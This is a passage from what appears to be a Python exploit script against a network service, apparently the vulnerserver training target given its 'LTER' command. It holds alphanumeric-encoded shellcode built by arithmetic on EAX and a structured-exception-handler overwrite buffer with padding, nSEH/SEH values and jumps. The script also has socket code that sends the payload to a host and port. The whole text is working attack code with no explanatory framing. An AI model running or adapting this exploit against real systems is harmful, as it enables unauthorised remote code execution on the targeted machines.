shell += b"\x05\x26\x51\x66\x36" ## add  eax, 0x36665126
shell += b"\x05\x14\x31\x45\x34" ## add  eax, 0x34453114
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x16\x20\x66\x77" ## add  eax, 0x77662016
shell += b"\x05\x16\x20\x56\x76" ## add  eax, 0x76562016
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x41\x13\x31\x76" ## add  eax, 0x76311341
shell += b"\x05\x40\x02\x40\x76" ## add  eax, 0x76400240
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x72\x65\x37\x36" ## add  eax, 0x36376572
shell += b"\x05\x71\x54\x47\x25" ## add  eax, 0x25475471
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x04\x76\x25\x64" ## add  eax, 0x64257604
shell += b"\x05\x04\x75\x25\x64" ## add  eax, 0x64257504
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x64\x47\x13\x22" ## add  eax, 0x22134764
shell += b"\x05\x54\x46\x13\x12" ## add  eax, 0x12134654
shell += b"\x05\x33\x45\x13\x22" ## add  eax, 0x22134533
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x44\x76\x36\x41" ## add  eax, 0x41367644
shell += b"\x05\x34\x65\x26\x31" ## add  eax, 0x31266534
shell += b"\x05\x33\x53\x24\x31" ## add  eax, 0x31245333
shell += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x13\x31\x54\x21" ## add  eax, 0x21543113
shell += b"\x05\x04\x40\x54\x20" ## add  eax, 0x20544004
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x31\x47\x30\x60" ## add  eax, 0x60304731
shell += b"\x05\x20\x47\x20\x50" ## add  eax, 0x50204720
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x11\x42\x16\x33" ## add  eax, 0x33164211
shell += b"\x05\x01\x41\x16\x24" ## add  eax, 0x24164101
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x34\x11\x02\x34" ## add  eax, 0x34021134
shell += b"\x05\x24\x01\x01\x24" ## add  eax, 0x24010124
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x65\x61\x31\x21" ## add  eax, 0x21316165
shell += b"\x05\x64\x50\x21\x10" ## add  eax, 0x10215064
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x36\x45\x70\x15" ## add  eax, 0x15704536
shell += b"\x05\x45\x44\x70\x14" ## add  eax, 0x14704445
shell += b"\x50"                 ## push eax
shell += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shell += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shell += b"\x05\x66\x76\x32\x62" ## add  eax, 0x62327666
shell += b"\x05\x55\x76\x21\x51" ## add  eax, 0x51217655
shell += b"\x50"                 ## push eax

buffer = esp_shell
buffer += shell
buffer += b"A" * (3440 - len(esp_shell) - len(shell))
buffer += esp_a
buffer += a_jmp
buffer += b"B" * (3514 - 3440 - len(esp_a) - len(a_jmp))
buffer += nseh
buffer += seh
buffer += alignEsp
buffer += d_jmp
buffer += b"C" * (4000 - len(buffer))


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print(s.recv(1024))
s.send(b"LTER /.../" + buffer)
print(s.recv(1024))
print(buffer)
s.close()
